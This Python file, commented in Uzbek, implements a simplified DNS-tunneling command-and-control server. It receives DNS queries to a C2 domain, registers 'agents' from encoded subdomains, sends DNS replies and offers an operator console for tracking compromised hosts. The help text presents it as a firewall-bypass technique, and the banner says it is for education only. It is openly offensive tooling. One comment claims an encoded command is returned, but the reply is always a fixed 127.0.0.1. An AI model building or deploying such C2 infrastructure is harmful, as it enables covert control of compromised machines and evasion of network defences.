"""
DNS Tunneling C2 Server
DNS so'rovlar orqali yashirin aloqa
"""

import socket
import struct
import threading
from datetime import datetime
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))


class DNSC2Server:
    """DNS Tunneling C2 Server"""
    
    def __init__(self, host='0.0.0.0', port=53, domain='c2.local'):
        self.host = host
        self.port = port
        self.domain = domain
        self.running = False
        self.agents = {}
        self.socket = None
        
    def start(self):
        """DNS server ishga tushirish"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.bind((self.host, self.port))
            self.running = True
            
            print(f"\n{'='*50}")
            print(f"🎯 DNS Tunneling C2 Server")
            print(f"⚠️  Faqat ta'lim maqsadida!")
            print(f"{'='*50}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] 🚀 DNS Server: {self.host}:{self.port}")
            print(f"📡 Domain: {self.domain}")
            print(f"\n📊 DNS Server CLI")
            print(f"Komandalar: agents, queries, status, help, quit")
            print(f"{'-'*50}\n")
            
            # Receive thread
            receive_thread = threading.Thread(target=self._receive_loop, daemon=True)
            receive_thread.start()
            
            # CLI loop
            self._cli_loop()
            
        except PermissionError:
            print("❌ Port 53 uchun administrator huquqlari kerak!")
            print("💡 Yoki boshqa port ishlatish: DNSServer(port=5353)")
        except Exception as e:
            print(f"❌ DNS Server xatosi: {e}")
            
    def _receive_loop(self):
        """DNS so'rovlarni qabul qilish"""
        while self.running:
            try:
                data, addr = self.socket.recvfrom(512)
                threading.Thread(
                    target=self._handle_query,
                    args=(data, addr),
                    daemon=True
                ).start()
            except:
                if self.running:
                    continue
                    
    def _handle_query(self, data, addr):
        """DNS query qayta ishlash"""
        try:
            # DNS query parsing (simplified)
            transaction_id = data[:2]
            
            # Extract domain name
            domain = self._parse_dns_name(data[12:])
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 📡 DNS Query: {domain} from {addr[0]}")
            
            # Check if it's our C2 domain
            if self.domain in domain:
                # Extract command from subdomain
                # Format: <agent_id>.<data>.<domain>
                parts = domain.split('.')
                if len(parts) >= 3:
                    agent_id = parts[0]
                    encoded_data = parts[1]
                    
                    # Register agent
                    if agent_id not in self.agents:
                        self.agents[agent_id] = {
                            'address': addr,
                            'first_seen': datetime.now(),
                            'last_seen': datetime.now(),
                            'queries': 0
                        }
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🆕 Yangi agent: {agent_id}")
                    
                    self.agents[agent_id]['last_seen'] = datetime.now()
                    self.agents[agent_id]['queries'] += 1
                    
                # Send DNS response with encoded command
                response = self._create_dns_response(transaction_id, domain, "127.0.0.1")
                self.socket.sendto(response, addr)
                
        except Exception as e:
            print(f"❌ DNS query qayta ishlash xatosi: {e}")
            
    def _parse_dns_name(self, data):
        """DNS name parsing"""
        try:
            name = []
            i = 0
            while i < len(data):
                length = data[i]
                if length == 0:
                    break
                i += 1
                name.append(data[i:i+length].decode('utf-8'))
                i += length
            return '.'.join(name)
        except:
            return ""
            
    def _create_dns_response(self, transaction_id, domain, ip):
        """DNS response yaratish"""
        # Simplified DNS response
        response = transaction_id
        response += b'\x81\x80'  # Flags
        response += b'\x00\x01'  # Questions
        response += b'\x00\x01'  # Answers
        response += b'\x00\x00'  # Authority
        response += b'\x00\x00'  # Additional
        
        # Question section
        for part in domain.split('.'):
            response += bytes([len(part)]) + part.encode()
        response += b'\x00'  # End of name
        response += b'\x00\x01'  # Type A
        response += b'\x00\x01'  # Class IN
        
        # Answer section
        response += b'\xc0\x0c'  # Name pointer
        response += b'\x00\x01'  # Type A
        response += b'\x00\x01'  # Class IN
        response += b'\x00\x00\x00\x3c'  # TTL (60 seconds)
        response += b'\x00\x04'  # Data length
        response += bytes(map(int, ip.split('.')))  # IP address
        
        return response
        
    def _cli_loop(self):
        """CLI loop"""
        while self.running:
            try:
                cmd = input("DNS-C2> ").strip().lower()
                
                if cmd == 'agents':
                    self._show_agents()
                elif cmd == 'queries':
                    print(f"📊 Total queries: {sum(a['queries'] for a in self.agents.values())}")
                elif cmd == 'status':
                    print(f"🟢 DNS Server: {self.host}:{self.port}")
                    print(f"📡 Domain: {self.domain}")
                    print(f"📊 Agents: {len(self.agents)}")
                elif cmd == 'help':
                    self._show_help()
                elif cmd == 'quit':
                    self.stop()
                    break
                    
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                print(f"❌ Xato: {e}")
                
    def _show_agents(self):
        """Agentlarni ko'rsatish"""
        if not self.agents:
            print("📭 Agentlar yo'q")
            return
            
        print(f"\n📊 DNS Agents ({len(self.agents)}):")
        print(f"{'-'*70}")
        print(f"{'ID':<15} {'IP':<20} {'Queries':<10} {'Last Seen'}")
        print(f"{'-'*70}")
        
        for agent_id, info in self.agents.items():
            addr = info['address'][0]
            queries = info['queries']
            last_seen = info['last_seen'].strftime('%H:%M:%S')
            print(f"{agent_id:<15} {addr:<20} {queries:<10} {last_seen}")
        print()
        
    def _show_help(self):
        """Yordam"""
        print("""
╔════════════════════════════════════════════════════════╗
║            DNS Tunneling C2 - Komandalar               ║
╠════════════════════════════════════════════════════════╣
║  agents              - DNS agentlarni ko'rsatish       ║
║  queries             - Jami so'rovlar soni             ║
║  status              - Server statusini ko'rsatish     ║
║  help                - Yordam                          ║
║  quit                - Chiqish                         ║
╠════════════════════════════════════════════════════════╣
║  💡 DNS Tunneling - Firewall bypass texnikasi          ║
║  📡 Format: <agent_id>.<data>.c2.local                 ║
╚════════════════════════════════════════════════════════╝
        """)
        
    def stop(self):
        """Serverni to'xtatish"""
        print("\n🛑 DNS Server to'xtatilmoqda...")
        self.running = False
        if self.socket:
            self.socket.close()
        print("✅ DNS Server to'xtatildi")


if __name__ == "__main__":
    # Port 53 administrator kerak, 5353 ishlatamiz
    server = DNSC2Server(host='0.0.0.0', port=5353, domain='c2.local')
    server.start()
